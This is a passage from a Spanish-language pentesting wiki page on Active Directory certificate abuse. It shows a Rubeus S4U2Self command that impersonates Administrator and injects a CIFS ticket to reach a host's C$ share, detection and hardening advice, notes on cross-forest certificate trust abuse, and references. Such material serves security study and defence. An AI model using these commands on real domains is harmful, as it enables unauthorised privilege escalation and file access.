S4U2Self permite a un servicio obtener un ticket **para sí mismo** que contiene los datos de autorización de otro usuario. Con el TGT del equipo, Rubeus puede solicitar ese ticket para un usuario privilegiado, reescribir el nombre del servicio en el KRB-CRED devuelto a CIFS e inyectarlo. Este es el primitive local de “delegar hacia uno mismo”: no requiere S4U2Proxy ni una entrada `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
El ticket sustituido solo puede ser utilizado por servicios en la **misma cuenta/clave de equipo** (en este caso, CIFS en `HOST`). No es un ticket de Administrator reutilizable en otros equipos del dominio. Además, el resultado demostrado es un acceso privilegiado a SMB/sistema de archivos como Administrator; obtener un proceso local de `NT AUTHORITY\SYSTEM` aún requiere un paso separado de ejecución remota.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detección y hardening

- En la CA, correlaciona los eventos **4886** (solicitud recibida) y **4887** (emitida) de Certification Services para detectar solicitudes inesperadas de plantillas `Machine` realizadas por cuentas de servidores IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- En los DC, el evento **4768** incluye campos de certificado cuando se utiliza autenticación previa mediante certificado; genera alertas para solicitudes TGT PKINIT inusuales de cuentas de servidores web. A continuación, busca solicitudes **4769** que involucren una identidad privilegiada suplantada y el mismo host. Debido a que Rubeus `/altservice` reescribe el nombre del servicio KRB-CRED en el cliente, no se debe exigir que el nombre del servicio 4769 del lado del DC sea `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Busca actividad de `w3wp.exe` accediendo a endpoints RPC de la CA, creación inesperada de archivos ASPX, acceso autenticado mediante Kerberos a recursos administrativos y actividad de extracción de secrets. Restringe, cuando sea posible, el acceso de la capa de aplicaciones a RPC de la CA, KDC y SMB, y elimina los permisos de enrollment de equipos o las plantillas de autenticación de equipos que no sean necesarias operativamente.<sup>[[19]](#references)</sup>

## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

La configuración para el **enrollment entre bosques** se hace relativamente sencilla. El **certificado de la CA raíz** del bosque de recursos es **publicado en los bosques de cuentas** por los administradores, y los certificados de la **enterprise CA** del bosque de recursos son **añadidos a los contenedores `NTAuthCertificates` y AIA de cada bosque de cuentas**. En otras palabras, esta configuración concede a la **CA del bosque de recursos control total** sobre todos los demás bosques para los que administra la PKI. Si esta CA es **comprometida por atacantes**, estos podrían **forjar certificados para todos los usuarios de los bosques de recursos y de cuentas**, rompiendo así el límite de seguridad del bosque.<sup>[[6]](#references)</sup>

### Enrollment Privileges Granted to Foreign Principals

En entornos con múltiples bosques, se debe tener precaución con las enterprise CAs que **publican plantillas de certificados** que permiten a **Authenticated Users o principals extranjeros** (usuarios/grupos externos al bosque al que pertenece la enterprise CA) obtener **permisos de enrollment y edición**.\
Al autenticarse a través de un trust, AD añade el **SID de Authenticated Users** al token del usuario. Por lo tanto, si un dominio posee una enterprise CA con una plantilla que **concede permisos de enrollment a Authenticated Users**, un usuario de un bosque diferente podría potencialmente **obtener un enrollment en dicha plantilla**. Del mismo modo, si una plantilla **concede explícitamente permisos de enrollment a un principal extranjero**, se crea una **relación de control de acceso entre bosques**, lo que permite a un principal de un bosque **obtener un enrollment en una plantilla de otro bosque**.

Ambos escenarios provocan un **aumento de la superficie de ataque** de un bosque a otro. Un atacante podría explotar la configuración de la plantilla de certificado para obtener privilegios adicionales en un dominio extranjero.<sup>[[6]](#references)</sup>


## References

- [1] [Repositorio PoC de aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Análisis técnico de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog de SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusando de Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nuevos métodos de autenticación y solicitud, y más](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusando del mapeo de cuentas mediante Key Trust para tomar el control de cuentas](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – La historia del (mal)uso de Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying a AD Certificate Services mediante RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Acceso shell a la CA de ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Técnica de abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Técnica de abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Escalada de privilegios (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: No es otro ESC de AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Configuración incorrecta y explotación](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Revisando “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC de enrollment de IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Escalada de privilegios desde IIS AppPool mediante el endpoint RPC de AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identidades de Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – comando pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditar Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Evento 4768: Se solicitó un ticket de autenticación Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Evento 4769: Se solicitó un ticket de servicio Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – toolkit de explotación de AD CS para PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
